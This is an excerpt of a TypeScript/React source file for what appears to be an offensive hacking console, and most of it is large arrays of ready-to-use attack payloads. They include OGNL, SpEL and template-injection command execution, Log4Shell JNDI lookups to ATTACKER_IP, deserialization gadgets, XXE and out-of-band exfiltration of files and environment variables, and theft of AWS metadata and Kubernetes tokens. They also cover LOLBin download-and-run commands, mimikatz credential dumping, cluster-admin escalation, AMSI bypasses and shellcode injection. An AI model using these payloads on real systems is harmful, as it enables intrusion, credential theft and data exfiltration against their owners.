...
const FUZZ_SETS: Record<string, string[]> = {
  ...
  "OGNL Inject": [
    ...
    "(#context['xwork.MethodAccessor.denyMethodExecution']=false,#_memberAccess['excludedClasses']=new java.util.HashSet(),#_memberAccess['excludedPackageNames']=new java.util.HashSet(),#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding('UTF-8'),#w=#res.getWriter(),#w.print(new java.util.Scanner(@java.lang.Runtime@getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()),#w.close())",
    "(#a=new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/sh','-c','id'})).redirectErrorStream(true).start().text",
    "%24%7B%23a%3D%28new%20java.lang.ProcessBuilder%28new%20java.lang.String%5B%5D%7B%22id%22%7D%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3D%23d.readLine%28%29%2C%23e%7D",
  ],
  "SpEL Inject": [
    "T(java.lang.Runtime).getRuntime().exec('id')",
    "T(Runtime).getRuntime().exec(T(String).valueOf(new char[]{105,100}))",
    "T(java.lang.ProcessBuilder).new(new String[]{'/bin/sh','-c','id'}).start()",
    "#{T(java.lang.Runtime).getRuntime().exec('id')}",
    "#{new ProcessBuilder(new String[]{'/bin/sh','-c','id'}).start()}",
    ...
    "*{T(java.lang.Runtime).getRuntime().exec('curl\thttp://ATTACKER_IP:PORT/?x=$(id|base64)')}",
  ...
  "Log4Shell Chains": [
    ...
    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://ATTACKER_IP:1099/exploit}",
    "${${lower:j}${lower:n}${lower:d}i:${lower:r}m${lower:i}://ATTACKER_IP:1099/exploit}",
    "${${upper:j}ndi:${upper:l}dap://ATTACKER_IP:1389/a}",
    "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//ATTACKER_IP:1389/exploit}",
    "${jndi:${lower:l}dap://ATTACKER_IP:1389/exploit}",
    "${${::-j}${::-n}${::-d}${::-i}:dns://ATTACKER_IP/a}",
    "${jndi:rmi://ATTACKER_IP:1099/exploit}",
    "${jndi:ldaps://ATTACKER_IP:636/a}",
    "X-Api-Version: ${jndi:ldap://ATTACKER_IP/a}",
    "User-Agent: ${jndi:ldap://ATTACKER_IP:1389/ex}",
    "${jndi:ldap://ATTACKER_IP:1389/${hostName}}",
    "${${::-j}ndi:ldap://ATTACKER_IP/a} (inject in every header: User-Agent, X-Forwarded-For, Accept-Language, etc.)",
  ],
  "Java Deserialization": [
    "(paste ysoserial CommonsBeanutils1 payload as base64 in body)",
    "aced0005 (Java serialized object magic bytes — use ysoserial to generate)",
    "rO0ABXNy (base64 Java serialized object magic bytes)",
    "(generate with: java -jar ysoserial.jar CommonsCollections6 'id' | base64)",
    "(generate with: java -jar ysoserial.jar Spring2 'id' | base64)",
    "(generate with: java -jar ysoserial.jar Groovy1 'id' | base64)",
    "(generate with: java -jar ysoserial.jar JRMPClient ATTACKER_IP:1099 | base64)",
    "(XStream: <dynamic-proxy><interface>java.lang.Runtime</interface></dynamic-proxy>)",
    "(SnakeYAML: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://ATTACKER_IP/exploit.jar\"]]]])",
  ],
  "Python Pickle RCE": [
    "cos\\nsystem\\n(S'id'\\ntR.",
    "cbuiltins\\nexec\\n(S\"import os; os.system('id')\"\\ntR.",
    "csubprocess\\ncheck_output\\n(lS'/bin/sh'\\naS'-c'\\naS'id'\\natR.",
    "(generate: python3 -c \"import pickle,os,base64;class E:__reduce__=lambda s:(__import__('os').system,('id',));print(base64.b64encode(pickle.dumps(E())))\")",
    "base64+pickle: gASVJQAAAAAAAACMCnN1YnByb2Nlc3OUjAljaGVja19jYWxslJOUKGgAWAIAAABpZJSFlFKULg==",
  ],
  "PHP Deserialization": [
    "O:8:\"stdClass\":1:{s:3:\"cmd\";s:2:\"id\";}",
    "O:29:\"Illuminate\\\\Support\\\\Collection\":1:{s:8:\"\\0*\\0items\";a:1:{i:0;O:40:\"Illuminate\\\\Auth\\\\Access\\\\AuthorizationException\":1:{s:18:\"\\0*\\0previousException\";r:1;}}}",
    "C:38:\"Symfony\\\\Component\\\\Config\\\\Resource\\\\FileResource\":10:{}",
    "phar://phar_file.phar/test (phar deserialization via stream wrapper)",
    "echo 'O:8:\"stdClass\":1:{s:3:\"cmd\";s:2:\"id\";}' | php -r 'var_dump(unserialize(file_get_contents(\"php://stdin\")));'",
  ],
  "SSTI Full Matrix": [
    "{{7*7}}",
    "{{7*'7'}}",
    ...
    "#set($s=\"\")#set($stringClass=$s.class)#set($runtime=$stringClass.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null))#set($process=$runtime.exec(\"id\"))#set($is=$process.inputStream)#set($reader=new java.io.InputStreamReader($is))#set($scl=new java.util.Scanner($reader))#set($line=$scl.nextLine())$line",
    "{{'id'|filter('system')}}",
    "{{''|format('%s')|attr('__class__')|attr('__mro__')|attr('__getitem__')(2)|attr('__subclasses__')()|attr('__getitem__')(40)('/etc/passwd')|attr('read')()}}",
    "<%= `id` %>",
    "<% system('id') %>",
    ...
    "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/sh','-c','id'})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#d.readLine()}",
  ],
  "XXE Enhanced": [
    ...
    "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM \"http://ATTACKER_IP/evil.dtd\">%dtd;]><root>&exfil;</root>",
    "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % content SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd '<!ENTITY exfil SYSTEM \"http://ATTACKER_IP/?x=%content;\">'>%dtd;]><root>&exfil;</root>",
    "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>",
    "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://localhost/admin\">]><root>&xxe;</root>",
  ...
  "DNS OOB": [
    ...
    "$(nslookup ATTACKER_DOMAIN 2>/dev/null)",
    "| curl -sk http://ATTACKER_IP:PORT/?x=$(id|base64) &",
    "'; curl -sk \"http://ATTACKER_IP:PORT/o?d=$(env|base64 -w0)\" 2>/dev/null; '",
    "$(id|base64|xargs -I{} curl -sk \"http://ATTACKER_IP:PORT/x?d={}\" 2>/dev/null)",
    "$(dig +short $(id|base64|tr -d '\\n='|cut -c1-50).ATTACKER_DOMAIN @8.8.8.8 2>/dev/null)",
    "; python3 -c \"import os,urllib.request,base64;urllib.request.urlopen('http://ATTACKER_IP:PORT/?d='+base64.b64encode(os.popen('id').read().encode()).decode())\" &",
    "${jndi:dns://ATTACKER_DOMAIN/test}",
    "webhook.site/UUID (use webhook.site as OOB receiver)",
    "; wget -qO- http://ATTACKER_IP:PORT/$(whoami) &",
  ],
  "AWS Specific": [
    ...
    "TOKEN=$(curl -sX PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\") && curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "env | grep -iE 'AWS_ACCESS_KEY|AWS_SECRET|AWS_SESSION_TOKEN'",
    "cat ~/.aws/credentials 2>/dev/null",
    "aws sts get-caller-identity 2>/dev/null",
    "aws s3 ls --no-sign-request 2>/dev/null",
    "aws secretsmanager list-secrets 2>/dev/null",
    "aws ssm get-parameters --with-decryption 2>/dev/null",
  ],
  "K8s Specific": [
    "cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null",
    "TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token); curl -sk https://kubernetes.default.svc/api/v1/secrets -H \"Authorization: Bearer $TOKEN\"",
    "TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token); curl -sk https://kubernetes.default.svc/api/v1/namespaces -H \"Authorization: Bearer $TOKEN\"",
    "cat /proc/1/cgroup | grep -i kube",
    "env | grep -iE 'KUBERNETES|K8S|KUBE'",
    "kubectl get secrets --all-namespaces 2>/dev/null",
    "ls -la /var/run/docker.sock 2>/dev/null && curl --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null",
...
const PAYLOAD_LIBRARY = [
  ...
  { cat:"LOLBINS",      col:"text-pink-400",  p:[
    `certutil.exe -urlcache -split -f http://ATTACKER_IP/shell.exe C:\\Windows\\Temp\\shell.exe && C:\\Windows\\Temp\\shell.exe`,
    `certutil.exe -decode C:\\Windows\\Temp\\encoded.b64 C:\\Windows\\Temp\\shell.exe`,
    `mshta.exe http://ATTACKER_IP/payload.hta`,
    `mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run(""cmd /c id"",0,True)"))`,
    `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("cmd.exe /c id",0,true);`,
    ...
    `wmic.exe process call create "cmd.exe /c id > C:\\Windows\\Temp\\out.txt"`,
    `bitsadmin /transfer job /download /priority normal http://ATTACKER_IP/shell.exe C:\\Windows\\Temp\\shell.exe`,
    `forfiles.exe /p C:\\Windows\\System32 /m notepad.exe /c "cmd /c id"`,
    `bash.exe -c id`,
    `wsl.exe id`,
    `powershell -nop -ep bypass -enc BASE64_ENCODED_PAYLOAD`,
    `powershell IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')`,
    `curl.exe http://ATTACKER_IP/shell.exe -o C:\\Windows\\Temp\\shell.exe && C:\\Windows\\Temp\\shell.exe`,
  ]},
  { cat:"PIVOTING",     col:"text-teal-400",  p:[
    `ssh -L LOCAL_PORT:TARGET_IP:TARGET_PORT USER@JUMP_HOST -N -f`,
    `ssh -R REMOTE_PORT:localhost:LOCAL_PORT USER@ATTACKER_HOST -N -f`,
    `ssh -D 1080 USER@JUMP_HOST -N -f && proxychains4 nmap TARGET_IP`,
    `socat TCP-LISTEN:LOCAL_PORT,fork TCP:TARGET_IP:TARGET_PORT &`,
    `./chisel server --port 8080 --reverse & (attacker) / ./chisel client ATTACKER_IP:8080 R:0.0.0.0:1080:socks (victim)`,
    `./ligolo-ng agent -connect ATTACKER_IP:11601 --ignore-cert & (victim)`,
    `./plink.exe -ssh -N -R REMOTE_PORT:TARGET_IP:TARGET_PORT USER@ATTACKER_HOST`,
    `iptables -t nat -A PREROUTING -p tcp --dport LOCAL_PORT -j DNAT --to-destination TARGET_IP:TARGET_PORT`,
    `nc -lvnp LOCAL_PORT | nc TARGET_IP TARGET_PORT &`,
    `mkfifo /tmp/pipe; nc -lvnp LOCAL_PORT </tmp/pipe | nc TARGET_IP TARGET_PORT >/tmp/pipe`,
    ...
    `./sshuttle -r USER@JUMP_HOST TARGET_SUBNET 2>/dev/null &`,
  ]},
  { cat:"ACTIVE DIR",   col:"text-yellow-300", p:[
    `net user /domain`,
    `net group "Domain Admins" /domain`,
    `nltest /domain_trusts /all_trusts`,
    `Get-ADUser -Filter * -Properties * | Select-Object Name,SamAccountName,Enabled | Export-Csv users.csv`,
    `Get-ADGroupMember -Identity "Domain Admins" -Recursive | Get-ADUser -Properties * | Select Name,SamAccountName,Enabled`,
    `Get-ADTrust -Filter * | Select Name,Direction,TrustType`,
    `(new-object system.net.webclient).downloadstring('http://ATTACKER_IP/PowerView.ps1')|iex; Invoke-BloodHound -CollectionMethod All`,
    ...
    `impacket-secretsdump DOMAIN/USER:PASS@DC_IP 2>/dev/null`,
    `impacket-GetNPUsers DOMAIN/ -no-pass -usersfile users.txt 2>/dev/null`,
    `.\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"`,
    `.\\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:DOMAIN /all" "exit"`,
    `crackmapexec smb SUBNET/24 -u USER -p PASS --shares 2>/dev/null`,
    `crackmapexec winrm TARGET_IP -u USER -p PASS -x "whoami /all" 2>/dev/null`,
  ]},
  { cat:"K8S EXPLOIT",  col:"text-blue-300",   p:[
    `kubectl get secrets --all-namespaces -o json | jq '.items[] | {name:.metadata.name, ns:.metadata.namespace, data:.data}'`,
    `kubectl exec -n NAMESPACE POD_NAME -- /bin/bash -c "env && cat /run/secrets/kubernetes.io/serviceaccount/token"`,
    `TOKEN=$(kubectl get secret $(kubectl get sa default -o jsonpath="{.secrets[0].name}") -o jsonpath="{.data.token}"|base64 -d); curl -sk https://kubernetes.default.svc/api/v1/secrets -H "Authorization: Bearer $TOKEN"`,
    `kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:default 2>/dev/null`,
    `kubectl run shell --image=alpine --restart=Never --command -- /bin/sh -c "nsenter -t 1 -m -u -i -n -p sh -c 'id && hostname'"`,
    `curl -sk https://kubernetes.default.svc/api/v1/pods -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)"`,
    `crictl ps --all 2>/dev/null`,
    `docker run -v /:/mnt alpine chroot /mnt id 2>/dev/null`,
  ]},
  { cat:"AV BYPASS",    col:"text-red-300",    p:[
    `powershell -enc $(echo -n "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')" | iconv -t UTF-16LE | base64 | tr -d '\\n')`,
    `powershell -nop -ep bypass -w hidden -c "IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('BASE64_ENCODED_PAYLOAD')))"`,
    `[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "http://ATTACKER_IP/payload.dll" -UseBasicParsing).Content); [Payload.Class]::Execute()`,
    `$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if ($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if ($e.Name -like "*InitFailed"){$f=$e}};$f.SetValue($null,$true) # AMSI bypass`,
    `[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").GetValue($null),0x41414141) # AMSI patch`,
    "sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL ).\"A\`ss\`Emble\`y\".\"GET\`TY\`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','s',',','System' )).\"g\`etf\`iElD\"( ( \"{0}{2}{1}\" -f'amsi','d','Initialize' ),( \"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,' )).\"sE\`TValUe\"( $null,$true )",
    `curl http://ATTACKER_IP/loader.bin -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x &`,
    `python3 -c "import ctypes,base64;shellcode=base64.b64decode('BASE64_SHELLCODE');buf=ctypes.create_string_buffer(shellcode);ctypes.windll.kernel32.VirtualProtect(buf,len(shellcode),0x40,ctypes.byref(ctypes.c_ulong()));ctypes.cast(buf,ctypes.CFUNCTYPE(None))()"`,
    `echo 'BASE64_SHELLCODE'|base64 -d|dd of=/proc/$(pgrep -f 'target_process')/mem bs=1 seek=OFFSET 2>/dev/null # process injection`,
  ]},
];
...
export default function MainLab({ onLockout }: { onLockout?: () => void } = {}) {
  ...
  // ── TERMINAL ──────────────────────────────────────────
  const tabTerminal = () => (
    <div className="flex flex-col min-h-[55vh] md:flex-1 md:min-h-0">
  ...
  return (
    <div className="min-h-screen md:h-screen bg-black text-zinc-300 font-mono flex flex-col select-none md:overflow-hidden">
      ...
      <div className="md:flex-1 md:flex md:flex-row md:overflow-hidden md:min-h-0">

        {/* Sidebar */}
        <aside className="w-full md:w-60 border-r border-red-900/30 bg-zinc-950 flex flex-col md:overflow-y-auto md:shrink-0">
        ...
        {/* Main area */}
        <main className="min-w-0 md:flex-1 md:flex md:flex-col md:min-h-0">
          ...
          <div className="md:flex-1 md:flex md:flex-col md:min-h-0 md:overflow-hidden">
